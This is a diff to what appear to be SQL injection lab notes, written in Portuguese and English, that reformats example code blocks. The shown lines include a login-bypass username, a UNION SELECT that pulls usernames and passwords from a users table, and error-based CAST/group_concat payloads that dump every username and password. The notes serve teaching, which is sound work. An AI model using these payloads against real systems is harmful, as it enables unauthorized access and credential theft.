@@ -29,7 +29,7 @@ Acaba-se com uma query mal formada, uma vez que nunca foram fechados os parentes
 Entao, se fizermos login com o username ```voldemort') -- //```, cria a seguinte query:
 
 ```sql
- "SELECT * FROM users where username=('Voldemort') -- // ') AND password = '.md5($password). 
+SELECT * FROM users where username=('Voldemort') -- // ') AND password = '.md5($password). 
 ```
 
 Assim já funciona a injection.
@@ -61,7 +61,7 @@ Portanto se fizermos:
 Cria a query:
 
 ```sql
-"SELECT * FROM products WHERE product_name LIKE '% 'union select null,id,username,password,fname from users -- %' 
+SELECT * FROM products WHERE product_name LIKE '% 'union select null,id,username,password,fname from users -- %' 
 ```
 
 Assim, alem de aparecerem os produtos, aparece tambem uma tabela com id, username, pass ...
@@ -135,7 +135,7 @@ Já sabemos a versao do server.
 #### Get info from the **users** table
 
 ```sql
- ' or 1 in (select username from users where id=1) -- //
+' or 1 in (select username from users where id=1) -- //
 ```
 
 #### List the tables of the information_schema ﬁrst database. You can obtain the list of table identiﬁers (TABLE_ID) and then use this information to obtain further data (e.g. WHERE TABLE_ID=1024)
@@ -149,11 +149,11 @@ This last example allows us to dump all rows from any column in any table. It ba
 #### List the usernames of all users stored in the users table
 
 ```sql
-'or 1=CAST((select group_concat(username) from users) AS SIGNED)-- //`
+' or 1=CAST((select group_concat(username) from users) AS SIGNED) -- //`
 ```
 
 #### List the passwords of all users stored in the users table
 
 ```sql
-'or 1=CAST((select group_concat(password) from users) AS SIGNED)-- //
+' or 1=CAST((select group_concat(password) from users) AS SIGNED) -- //
 ```
